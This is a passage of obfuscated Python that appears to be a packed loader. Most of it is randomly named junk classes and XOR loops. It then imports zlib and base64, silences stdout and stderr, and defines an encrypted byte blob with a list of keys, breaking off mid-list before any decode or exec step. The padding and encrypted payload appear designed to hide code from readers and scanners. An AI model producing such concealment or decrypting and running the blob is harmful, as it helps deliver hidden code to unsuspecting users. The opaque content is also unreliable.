    def _m72_a(self, x):
        return x ^ 1698
    def _m72_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C62_919587:
    def _m62_a(self, x):
        return x ^ 55225
    def _m62_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C43_218922:
    def _m43_a(self, x):
        return x ^ 12450
    def _m43_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C75_877304:
    def _m75_a(self, x):
        return x ^ 9338
    def _m75_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C14_626311:
    def _m14_a(self, x):
        return x ^ 11107
    def _m14_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C27_801156:
    def _m27_a(self, x):
        return x ^ 16605
    def _m27_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C10_967879:
    def _m10_a(self, x):
        return x ^ 10119
    def _m10_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C60_505555:
    def _m60_a(self, x):
        return x ^ 39520
    def _m60_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C67_193182:
    def _m67_a(self, x):
        return x ^ 38064
    def _m67_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C70_727407:
    def _m70_a(self, x):
        return x ^ 30787
    def _m70_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C84_795004:
    def _m84_a(self, x):
        return x ^ 48615
    def _m84_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C57_912007:
    def _m57_a(self, x):
        return x ^ 26208
    def _m57_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C13_881650:
    def _m13_a(self, x):
        return x ^ 33018
    def _m13_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C37_436199:
    def _m37_a(self, x):
        return x ^ 44374
    def _m37_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C73_123018:
    def _m73_a(self, x):
        return x ^ 27834
    def _m73_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C69_815421:
    def _m69_a(self, x):
        return x ^ 14224
    def _m69_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C86_706219:
    def _m86_a(self, x):
        return x ^ 62358
    def _m86_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C34_174569:
    def _m34_a(self, x):
        return x ^ 27286
    def _m34_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C8_415467:
    def _m8_a(self, x):
        return x ^ 60581
    def _m8_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C32_804933:
    def _m32_a(self, x):
        return x ^ 21048
    def _m32_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C52_617900:
    def _m52_a(self, x):
        return x ^ 62096
    def _m52_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C23_262364:
    def _m23_a(self, x):
        return x ^ 34189
    def _m23_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C77_715221:
    def _m77_a(self, x):
        return x ^ 31366
    def _m77_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C20_465897:
    def _m20_a(self, x):
        return x ^ 25400
    def _m20_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C35_620510:
    def _m35_a(self, x):
        return x ^ 42146
    def _m35_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C64_388418:
    def _m64_a(self, x):
        return x ^ 41402
    def _m64_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C39_881126:
    def _m39_a(self, x):
        return x ^ 25247
    def _m39_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C44_848588:
    def _m44_a(self, x):
        return x ^ 18672
    def _m44_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C33_334219:
    def _m33_a(self, x):
        return x ^ 55669
    def _m33_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C50_378501:
    def _m50_a(self, x):
        return x ^ 38052
    def _m50_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C53_638820:
    def _m53_a(self, x):
        return x ^ 47725
    def _m53_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C45_593876:
    def _m45_a(self, x):
        return x ^ 6433
    def _m45_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C61_280573:
    def _m61_a(self, x):
        return x ^ 11435
    def _m61_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C42_706308:
    def _m42_a(self, x):
        return x ^ 43563
    def _m42_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C47_798983:
    def _m47_a(self, x):
        return x ^ 12894
    def _m47_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C74_106195:
    def _m74_a(self, x):
        return x ^ 54573
    def _m74_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C76_514767:
    def _m76_a(self, x):
        return x ^ 52330
    def _m76_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C82_760756:
    def _m82_a(self, x):
        return x ^ 62831
    def _m82_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C58_967113:
    def _m58_a(self, x):
        return x ^ 34677
    def _m58_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C85_449541:
    def _m85_a(self, x):
        return x ^ 44783
    def _m85_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C22_457347:
    def _m22_a(self, x):
        return x ^ 63356
    def _m22_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C78_697737:
    def _m78_a(self, x):
        return x ^ 33261
    def _m78_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C29_359257:
    def _m29_a(self, x):
        return x ^ 26534
    def _m29_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C16_113397:
    def _m16_a(self, x):
        return x ^ 35425
    def _m16_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C56_509498:
    def _m56_a(self, x):
        return x ^ 19465
    def _m56_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C25_671467:
    def _m25_a(self, x):
        return x ^ 39396
    def _m25_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C6_612357:
    def _m6_a(self, x):
        return x ^ 4170
    def _m6_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C54_681042:
    def _m54_a(self, x):
        return x ^ 9664
    def _m54_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C80_593734:
    def _m80_a(self, x):
        return x ^ 56150
    def _m80_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C4_916448:
    def _m4_a(self, x):
        return x ^ 24611
    def _m4_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C81_482521:
    def _m81_a(self, x):
        return x ^ 4884
    def _m81_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C12_143004:
    def _m12_a(self, x):
        return x ^ 10202
    def _m12_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C41_204072:
    def _m41_a(self, x):
        return x ^ 59506
    def _m41_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C65_175298:
    def _m65_a(self, x):
        return x ^ 25958
    def _m65_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C30_367689:
    def _m30_a(self, x):
        return x ^ 42246
    def _m30_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C36_994611:
    def _m36_a(self, x):
        return x ^ 27866
    def _m36_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C55_869876:
    def _m55_a(self, x):
        return x ^ 39983
    def _m55_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C0_435599:
    def _m0_a(self, x):
        return x ^ 30154
    def _m0_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C51_314134:
    def _m51_a(self, x):
        return x ^ 2539
    def _m51_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C49_327852:
    def _m49_a(self, x):
        return x ^ 49558
    def _m49_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C5_229573:
    def _m5_a(self, x):
        return x ^ 48544
    def _m5_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C31_905474:
    def _m31_a(self, x):
        return x ^ 52633
    def _m31_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C38_153998:
    def _m38_a(self, x):
        return x ^ 20721
    def _m38_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C40_212310:
    def _m40_a(self, x):
        return x ^ 29576
    def _m40_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C19_282867:
    def _m19_a(self, x):
        return x ^ 18547
    def _m19_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C17_554721:
    def _m17_a(self, x):
        return x ^ 41780
    def _m17_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C28_224113:
    def _m28_a(self, x):
        return x ^ 24988
    def _m28_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C11_525410:
    def _m11_a(self, x):
        return x ^ 12162
    def _m11_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C24_966120:
    def _m24_a(self, x):
        return x ^ 41688
    def _m24_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C79_122293:
    def _m79_a(self, x):
        return x ^ 57606
    def _m79_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C83_604330:
    def _m83_a(self, x):
        return x ^ 21995
    def _m83_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C1_189514:
    def _m1_a(self, x):
        return x ^ 18051
    def _m1_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C3_145811:
    def _m3_a(self, x):
        return x ^ 340
    def _m3_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C26_205628:
    def _m26_a(self, x):
        return x ^ 1733
    def _m26_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C18_585679:
    def _m18_a(self, x):
        return x ^ 26303
    def _m18_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
_lp69_964716 = 0
for _i in range(1):
    _lp69_964716 ^= _i * 60
    _lp69_964716 &= 0xFFFFFFFF
_lp83_186851 = 0
for _i in range(16):
    _lp83_186851 ^= _i * 97
    _lp83_186851 &= 0xFFFFFFFF
_lp8_237585 = 0
for _i in range(54):
    _lp8_237585 ^= _i * 72
    _lp8_237585 &= 0xFFFFFFFF
_lp47_952138 = 0
for _i in range(50):
    _lp47_952138 ^= _i * 44
    _lp47_952138 &= 0xFFFFFFFF
_lp11_365677 = 0
for _i in range(9):
    _lp11_365677 ^= _i * 3
    _lp11_365677 &= 0xFFFFFFFF
_lp3_175002 = 0
for _i in range(58):
    _lp3_175002 ^= _i * 88
    _lp3_175002 &= 0xFFFFFFFF
_lp17_810570 = 0
for _i in range(51):
    _lp17_810570 ^= _i * 35
    _lp17_810570 &= 0xFFFFFFFF
_lp31_940970 = 0
for _i in range(75):
    _lp31_940970 ^= _i * 73
    _lp31_940970 &= 0xFFFFFFFF
_lp40_543457 = 0
for _i in range(81):
    _lp40_543457 ^= _i * 1
    _lp40_543457 &= 0xFFFFFFFF
_lp22_704189 = 0
for _i in range(61):
    _lp22_704189 ^= _i * 40
    _lp22_704189 &= 0xFFFFFFFF
_lp54_285196 = 0
for _i in range(33):
    _lp54_285196 ^= _i * 95
    _lp54_285196 &= 0xFFFFFFFF
_lp46_498735 = 0
for _i in range(20):
    _lp46_498735 ^= _i * 48
    _lp46_498735 &= 0xFFFFFFFF
_lp0_337077 = 0
for _i in range(37):
    _lp0_337077 ^= _i * 85
    _lp0_337077 &= 0xFFFFFFFF
_lp87_615954 = 0
for _i in range(44):
    _lp87_615954 ^= _i * 66
    _lp87_615954 &= 0xFFFFFFFF
_lp66_587633 = 0
for _i in range(14):
    _lp66_587633 ^= _i * 70
    _lp66_587633 &= 0xFFFFFFFF
_lp4_366642 = 0
for _i in range(60):
    _lp4_366642 ^= _i * 20
    _lp4_366642 &= 0xFFFFFFFF
_lp77_367312 = 0
for _i in range(94):
    _lp77_367312 ^= _i * 37
    _lp77_367312 &= 0xFFFFFFFF
_lp86_626335 = 0
for _i in range(56):
    _lp86_626335 ^= _i * 62
    _lp86_626335 &= 0xFFFFFFFF
_lp32_467634 = 0
for _i in range(43):
    _lp32_467634 ^= _i * 9
    _lp32_467634 &= 0xFFFFFFFF
_lp42_230558 = 0
for _i in range(19):
    _lp42_230558 ^= _i * 59
    _lp42_230558 &= 0xFFFFFFFF
_lp49_494889 = 0
for _i in range(29):
    _lp49_494889 ^= _i * 21
    _lp49_494889 &= 0xFFFFFFFF
_lp64_562594 = 0
for _i in range(43):
    _lp64_562594 ^= _i * 39
    _lp64_562594 &= 0xFFFFFFFF
_lp84_604633 = 0
for _i in range(65):
    _lp84_604633 ^= _i * 18
    _lp84_604633 &= 0xFFFFFFFF
_lp28_894320 = 0
for _i in range(6):
    _lp28_894320 ^= _i * 73
    _lp28_894320 &= 0xFFFFFFFF
_lp33_959743 = 0
for _i in range(11):
    _lp33_959743 ^= _i * 84
    _lp33_959743 &= 0xFFFFFFFF
_lp48_764616 = 0
for _i in range(37):
    _lp48_764616 ^= _i * 31
    _lp48_764616 &= 0xFFFFFFFF
_lp61_294326 = 0
for _i in range(88):
    _lp61_294326 ^= _i * 8
    _lp61_294326 &= 0xFFFFFFFF
_lp43_638424 = 0
for _i in range(19):
    _lp43_638424 ^= _i * 39
    _lp43_638424 &= 0xFFFFFFFF
_lp24_730365 = 0
for _i in range(76):
    _lp24_730365 ^= _i * 30
    _lp24_730365 &= 0xFFFFFFFF
_lp67_447937 = 0
for _i in range(79):
    _lp67_447937 ^= _i * 20
    _lp67_447937 &= 0xFFFFFFFF
_lp52_429199 = 0
for _i in range(38):
    _lp52_429199 ^= _i * 35
    _lp52_429199 &= 0xFFFFFFFF
_lp25_800866 = 0
for _i in range(70):
    _lp25_800866 ^= _i * 100
    _lp25_800866 &= 0xFFFFFFFF
_lp16_110584 = 0
for _i in range(74):
    _lp16_110584 ^= _i * 40
    _lp16_110584 &= 0xFFFFFFFF
_lp39_297957 = 0
for _i in range(97):
    _lp39_297957 ^= _i * 74
    _lp39_297957 &= 0xFFFFFFFF
_lp15_916290 = 0
for _i in range(4):
    _lp15_916290 ^= _i * 89
    _lp15_916290 &= 0xFFFFFFFF
_lp60_519695 = 0
for _i in range(14):
    _lp60_519695 ^= _i * 32
    _lp60_519695 &= 0xFFFFFFFF
_lp79_263509 = 0
for _i in range(75):
    _lp79_263509 ^= _i * 40
    _lp79_263509 &= 0xFFFFFFFF
_lp82_256391 = 0
for _i in range(43):
    _lp82_256391 ^= _i * 91
    _lp82_256391 &= 0xFFFFFFFF
_lp36_575622 = 0
for _i in range(85):
    _lp36_575622 ^= _i * 97
    _lp36_575622 &= 0xFFFFFFFF
_lp12_364772 = 0
for _i in range(95):
    _lp12_364772 ^= _i * 53
    _lp12_364772 &= 0xFFFFFFFF
_lp20_747565 = 0
for _i in range(30):
    _lp20_747565 ^= _i * 57
    _lp20_747565 &= 0xFFFFFFFF
_lp76_611659 = 0
for _i in range(3):
    _lp76_611659 ^= _i * 22
    _lp76_611659 &= 0xFFFFFFFF
_lp21_881095 = 0
for _i in range(7):
    _lp21_881095 ^= _i * 63
    _lp21_881095 &= 0xFFFFFFFF
_lp35_608728 = 0
for _i in range(38):
    _lp35_608728 ^= _i * 85
    _lp35_608728 &= 0xFFFFFFFF
_lp13_601489 = 0
for _i in range(62):
    _lp13_601489 ^= _i * 51
    _lp13_601489 &= 0xFFFFFFFF
_lp56_657681 = 0
for _i in range(7):
    _lp56_657681 ^= _i * 98
    _lp56_657681 &= 0xFFFFFFFF
_lp53_135440 = 0
for _i in range(51):
    _lp53_135440 ^= _i * 32
    _lp53_135440 &= 0xFFFFFFFF
_lp30_842810 = 0
for _i in range(57):
    _lp30_842810 ^= _i * 1
    _lp30_842810 &= 0xFFFFFFFF
_lp73_717938 = 0
for _i in range(13):
    _lp73_717938 ^= _i * 98
    _lp73_717938 &= 0xFFFFFFFF
_lp7_762009 = 0
for _i in range(98):
    _lp7_762009 ^= _i * 38
    _lp7_762009 &= 0xFFFFFFFF
_lp63_410112 = 0
for _i in range(24):
    _lp63_410112 ^= _i * 7
    _lp63_410112 &= 0xFFFFFFFF
_lp18_114705 = 0
for _i in range(6):
    _lp18_114705 ^= _i * 44
    _lp18_114705 &= 0xFFFFFFFF
_lp27_676939 = 0
for _i in range(98):
    _lp27_676939 ^= _i * 47
    _lp27_676939 &= 0xFFFFFFFF
_lp10_871533 = 0
for _i in range(32):
    _lp10_871533 ^= _i * 7
    _lp10_871533 &= 0xFFFFFFFF
_lp78_694687 = 0
for _i in range(66):
    _lp78_694687 ^= _i * 85
    _lp78_694687 &= 0xFFFFFFFF
_lp6_629229 = 0
for _i in range(88):
    _lp6_629229 ^= _i * 81
    _lp6_629229 &= 0xFFFFFFFF
_lp5_266272 = 0
for _i in range(64):
    _lp5_266272 ^= _i * 42
    _lp5_266272 &= 0xFFFFFFFF
_lp68_249439 = 0
for _i in range(59):
    _lp68_249439 ^= _i * 42
    _lp68_249439 &= 0xFFFFFFFF
_lp38_408898 = 0
for _i in range(9):
    _lp38_408898 ^= _i * 19
    _lp38_408898 &= 0xFFFFFFFF
_lp59_819948 = 0
for _i in range(30):
    _lp59_819948 ^= _i * 54
    _lp59_819948 &= 0xFFFFFFFF
_lp62_497295 = 0
for _i in range(60):
    _lp62_497295 ^= _i * 93
    _lp62_497295 &= 0xFFFFFFFF
_lp29_217975 = 0
for _i in range(45):
    _lp29_217975 ^= _i * 35
    _lp29_217975 &= 0xFFFFFFFF
_lp14_442472 = 0
for _i in range(37):
    _lp14_442472 ^= _i * 74
    _lp14_442472 &= 0xFFFFFFFF
_lp50_896713 = 0
for _i in range(8):
    _lp50_896713 ^= _i * 81
    _lp50_896713 &= 0xFFFFFFFF
_lp80_151926 = 0
for _i in range(27):
    _lp80_151926 ^= _i * 52
    _lp80_151926 &= 0xFFFFFFFF
_lp19_433413 = 0
for _i in range(86):
    _lp19_433413 ^= _i * 76
    _lp19_433413 &= 0xFFFFFFFF
_lp51_143664 = 0
for _i in range(2):
    _lp51_143664 ^= _i * 91
    _lp51_143664 &= 0xFFFFFFFF
_lp45_912033 = 0
for _i in range(61):
    _lp45_912033 ^= _i * 97
    _lp45_912033 &= 0xFFFFFFFF
_lp2_869363 = 0
for _i in range(21):
    _lp2_869363 ^= _i * 42
    _lp2_869363 &= 0xFFFFFFFF
_lp58_750979 = 0
for _i in range(36):
    _lp58_750979 ^= _i * 35
    _lp58_750979 &= 0xFFFFFFFF
_lp55_378030 = 0
for _i in range(59):
    _lp55_378030 ^= _i * 56
    _lp55_378030 &= 0xFFFFFFFF
_lp81_359340 = 0
for _i in range(45):
    _lp81_359340 ^= _i * 98
    _lp81_359340 &= 0xFFFFFFFF
_lp44_303151 = 0
for _i in range(35):
    _lp44_303151 ^= _i * 58
    _lp44_303151 &= 0xFFFFFFFF
_lp23_948414 = 0
for _i in range(15):
    _lp23_948414 ^= _i * 85
    _lp23_948414 &= 0xFFFFFFFF
_lp70_948207 = 0
for _i in range(86):
    _lp70_948207 ^= _i * 43
    _lp70_948207 &= 0xFFFFFFFF
_lp72_427145 = 0
for _i in range(75):
    _lp72_427145 ^= _i * 57
    _lp72_427145 &= 0xFFFFFFFF
_lp37_391541 = 0
for _i in range(98):
    _lp37_391541 ^= _i * 84
    _lp37_391541 &= 0xFFFFFFFF
_lp57_133591 = 0
for _i in range(57):
    _lp57_133591 ^= _i * 63
    _lp57_133591 &= 0xFFFFFFFF
_lp74_563957 = 0
for _i in range(16):
    _lp74_563957 ^= _i * 39
    _lp74_563957 &= 0xFFFFFFFF
_lp41_836926 = 0
for _i in range(72):
    _lp41_836926 ^= _i * 47
    _lp41_836926 &= 0xFFFFFFFF
_lp75_302472 = 0
for _i in range(83):
    _lp75_302472 ^= _i * 61
    _lp75_302472 &= 0xFFFFFFFF
_lp71_614560 = 0
for _i in range(17):
    _lp71_614560 ^= _i * 4
    _lp71_614560 &= 0xFFFFFFFF
_lp1_344221 = 0
for _i in range(84):
    _lp1_344221 ^= _i * 74
    _lp1_344221 &= 0xFFFFFFFF
_lp34_991391 = 0
for _i in range(16):
    _lp34_991391 ^= _i * 93
    _lp34_991391 &= 0xFFFFFFFF
_lp85_665907 = 0
for _i in range(44):
    _lp85_665907 ^= _i * 10
    _lp85_665907 &= 0xFFFFFFFF
_lp65_378839 = 0
for _i in range(49):
    _lp65_378839 ^= _i * 2
    _lp65_378839 &= 0xFFFFFFFF
_lp9_795728 = 0
for _i in range(74):
    _lp9_795728 ^= _i * 84
    _lp9_795728 &= 0xFFFFFFFF
_lp26_447627 = 0
for _i in range(90):
    _lp26_447627 ^= _i * 78
    _lp26_447627 &= 0xFFFFFFFF
import zlib, base64, sys, os as _os, random as _rnd

if sys.stdout is None:
    sys.stdout = open(_os.devnull, 'w')
if sys.stderr is None:
    sys.stderr = open(_os.devnull, 'w')

_m = b'\xa7\xf9YP\xe7\xe2\xce\xd7\x89y\x92\x91\x189\x07\xcfZf3\xb0\x7f\xb0/\xe5R\xff\xd4\x96Q\x89\xee,\x07\x86UTSc\xd9,Y\xc8\x9a\x9d\x9f\xda\x07\xaay\xf1\xc16\xc4\x1c?]o@\xf6T\xcfw\xd3i\'W\xbc\xa7\x15\x0b\xef\xc9\x9bq4"\xf4\xcd\xd1\x84\x1c\xc9s\xa2d\x0c\xe7\xcddI\x0c\xa9t\xb9\x8f\xfe\xd3\xf4X\\\xc4\x95\x9c\x84\x96W,{\x95g:\xd0%\xe7\xa6\xe3\x18\xdb\xf6A\xca\x1b\xe1&K\x9e+q'
_lk = [b"[\xb2\x1a\xd6zw\xdcf\x03\xd2\x9b\xc4s\x92Rr\xde8.$\xe5\xe2\xf4#Zu\xf6\x0b.\x9a\xa5p\x88es\xac\xd2[\xc1I\xf4\x89k\xf8\x13#i\x8e-t)D_$>\x1d\x02~H\xddN\xee?\xad\xfc]\x0f'L\xa3\x1f\x0e\xd0 \xcf\x9e\tn\x8dx\\\xd1]\xa9\x94h\xa0v)Y|M\xfa\xdfl\x15\x9a\x89}'\x84\xdc\xf5\xd5\xc9\x9d\xe94:Bm\xe3\x02\xb5\x86\x13\x19\xce\x7f\x9c'\xc8\x96\xd4B%\x17$", b'\x13\x88p \x9eD\x8al\x82(b\xf4A\xeb\xa7\x0b\x00\xb8D\xb4\xc3\x99\xce]\xdd<\xf0Zn\xcatL\xa6A\xa6w\xc7\xaf?\x91Q\x81u\xf3\xbd\x85\xef\xe4\xc77\xf5.Rm]\xf3\xa0\xd8[\xb3\x99\xe19\x18\xe31\x08\x90[\xca\'H[A\xf1\xcc\x14i\xadpL1\xed(\\f\x06\r%\xea:\xba]\xdc\x8c\xf0\x12S\x0e2o\xeay3\x95\xddR#\xb5\x1f(\xc3\x96"\x86\xc8\xaf\x0b\'[TF.$\xdc\xebn6', b"\x14jS:\xbc\xc6b\xf1\x83\xb7W\xb3\x17\xc4\x06\xf8I\x90K\x1d\x9eW\x11\xf3\xd4e9\xb0%E6(\xcf\x16\xa3\x97.GQoW6m\xf5\x81\x92\x0fr6\x9d\x0e\xfb\xfb\x8b\x14e&\x0c9~\r\xbe^\xb1\x07\x14\xc3\x7fhf\xc6p\xf1\x85\xa6\x856\x881\xbfUL\xb2b&s\xfbO\xef\x0b\xe1\x00\xf8'\x1b\xf9\xfd\xf2\x1e\xb1ns\x05\x17e\xf2g\xc6\xe7\x81\x8f_\xcd\xf7\xde;\x1eJ0E\xbb)\x92\x9dwb\xf3Q", b'\x81|"AF#\xaf\xd6\xce\xe8\xb7\x94\x8b\x9e\xe4\x86\xe7\x87Z\x04\xe7\xe9\x11\xeb\x01TO3\x18\xc7L\x04y>\xac\xd3V\xd6\x18h\xa6G\x07\xcef)\xf9\xd7\xca\xf9\xd1\x98C\x8e\xd2:\x95ya{\xc3\xe5\xd9gQ\xca\x92\x8c\xb2\xf6\t\x18}\x9f T\xcfS\x9b\x9a\xe9\x95_K>\xf04wv\x0b\xd69\x10\xc2#mz\xe2\x15\xd8\xa1Q\xc9`\x1dVtt\x1b\xdexq4s?\xd6\xd8y\x15\xef\xa6\x8d\xbbc\xb4\x9a\xe3.', b"\x84\xa8\xfa\xe6\x91\xc4\xef\xb3\xf0\xf0\xb7@Q\xb1\x1d\xc4f\xe5,\x12l\xfa\x06\xbb\x1eFd\xa8*\xe2\nC\xee\xde\x80\x00\xe0\x0f\x9cS\x9d\xa9\xb5\xc4\xb6\x10\x1a\xc3kv\xc0\xf0\xf6*\x8a\x0e+bf\x8f\xff\xed\xec\xe3\xc0B(\x1b\x8b\x9e\xd3o\xc1)m\xdcM\x88\x17\x84t\x00\xd5\xdd\x18T\xa1\x13\xe8\xae'B\xbe\xe6\xa6>+\xeb\xb5\xb1\xbe\xa3Au\x8a\xc2\xd17\xc9\xec\xab\xcd\xca\xee\xd4\xc9\x83\xf9\x8b\xc5\n\x8d\x91\xe7b\xa8\x7f\x0f", b'\x0c\xebj4i \xc1\x8f\xc2;6U\tB\x11Z\xc2\xfa\x86ek\xe35v\xb7d\xa9\xc0\x19\xba\xbb\xb8H\x1e\x81\x84U\xd0)\x06\x1d\x1e\x8dR\x88\x1d\xc9\r\x16\xfd\xe4\xf0W\xb0{\xbfa\xaeSt\xcd\xc0\xdd\x80L\xdd\x11\xbe2\x8bc\xe6O\xc1\xd1(\x1f\xfb\x8c\\\xc1\x7f\x92jRICj`,\xf7|\x9c\xde\xb6\xadw\x07G\xcaD\x06\xd5\xd6\xdaJ\x98\t\xb3\xa3\\a\xa6\xc1^O\x18\xc5\xb6\xc2^\x18\xd1z\xae\x86\xa1\xa1', b'\xa8\xa7Vxk,i\xd8KIg\x96\x1a\x15E!\xe1\x1e\xe3\xbc\xc7*\xe9\x9d\xb4\x07\xc0 d\x0e\xc7\x9e\x87j\x0fkw\x89ww\x82\x00\xd6&\xd2\\\xaa0\x03\xb1\x10{\xf3?/\xfd+\xa6\xdd/\xd2\xe9s\xee(h\xbe\xb7h\xf6a/\xcd\x9a(\xc6\xe6k\x85k\x9e\x9a?\x7f\x85\x0e\xda\xd9\xdc\xba\xcb(\x9fK\x9e\xb7\xa7\xa8>\xa01\xf4\x12=-mu;\xb0\xb6\x86\x9b\x86\x01\xde\x7f\x95p\xdf\x14^\n\xde\x82.R}\xce', b'\x07\x18s\x06"NAwA\x17\xd7>\x05\xa0\x8d\x9b\xa9\xb8\xd5\x12\xe4\xd5\x92x\x83=\xe3\x81\x1a\x8e\x10\xcc\xc9 \xed\xc9\xcd8X\xea\xe5\xe7\xc6JLR\xd1\x1e\xb9E\xf3$@\xb8\x19\xd1\xf9J\xf9\x9b\xdf\x92\xa9V\x0f[\x99\xdb\xac\xbc\xff\x10<\xa9\x9d\x06\xae\xea\xb2\x1a\xa1\'fg\x16I\xbc\xa3\x8c\x0fg\xa6\x19\xeaE\rxu\x7f\xcc=\xe7\xff\x07\xfc\xd4yy9\x1dt\xdb\xc8\x17\'\x10f\x12:XX,\xd2m\x19\x0b\x04v', b'"a\xb1\x10\xd2\xa7\xa1\x18\x03\x80Xv\x99Ue?\xbf`\xc6a\x0c\r\xcc\xf6\xde\x14{!\xa2NWf\xd7S/7\xe4S\x83C\xb7\x19<U\xb7A-"\xa1Q\xda\x9a\xe1\x90H\xc9\x12\x9e\xd3d\x18J=09B\x1dH\xce\xf7`\x12\xf1\x01\x06\xa8\xc0~\xd6S\xaf\xcaC\xb5\xec\xab\x95\xf6K\x8c\xa5\xcet\xa8\xde)\x93\xc6\xc4<\xa2\xa7\xcdJ~\x06\x10\x90f\xcdg\xa2\xa0b?\xb9\xc1}\x86\xb0o6\xcd.$\xe3\x14\x10', b'\xdb!l\xad\xa9\x16s\x08\xb8,\xf9\x0cU\xba\x8aj\xbd\xcf"\xb0\xa3y/\n\'aH\xdf\'\x19Mf\xde3\x95\x84\xc7\x8e5\x86\xdb\xa2\x1a\n\x81D\x08R\x0b\xe2\xca\xa5[4\x1b\x00\xee\x17r\xb5U)\x90\n\x03\xc5\xf09\xab\r\xf3)\xac\xe2M*\xf4Tx\x1b\xbb\xf17\xf0\xe0\x96\x8e2\xb2\xe94\xdd\xd1\xf1\x10\xf1l\xeck\xfe\xcf^HV\x9c\xba6P\xf6\xc9\xf0\xec\xd5\xdb\x1cDe\xb7w\xb5=a\xc6\xf1-\x9cu\xa2', b"\xa3\xf0\xe4\x9c\x85\xf0\xc5_\x82\x1f\x84\xfc^`S\x02\x13\x90Y\x8cDU\xfbV\xdav\xe1\x045\x81\x91\x88\x0bJ\x84[\xed\xbc\x1f\x15c\xb9\xe6\x9a\x80zOa\x0b\xbe\x08\x8dW\x1ac\xf4\xfa[\xd3\x93\xf2\xd6}\xf3q\x04a\x19\x8d\xa4\xbf\xd1\xc0\xd2d\xa2\t\xd0\xfe\x9eNn}\xd4\xf4\x8b\xd0\xf2\xdf\xb9\xc4\x8aaC\x14l\x98\xed\x05\xbb\xfe\xb5\xe6a\x84'p\xa2\x136\xfc\x12\xb2\x1c\xaf\x8cD\x00\xa1\x0eK\xf6,N\r(q\xcd", 